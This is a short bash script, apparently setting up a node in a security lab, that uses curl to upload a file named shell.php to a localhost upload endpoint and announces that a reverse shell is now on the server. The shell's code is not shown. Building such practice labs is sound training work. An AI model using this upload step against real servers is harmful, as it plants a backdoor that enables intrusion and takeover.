#!/bin/bash
echo "[*] Setting up Node 3 (Reverse Shell via Web)..."
curl -F "file=@shell.php" http://localhost/upload
echo "[+] Node 3 Ready: Reverse shell uploaded to server."
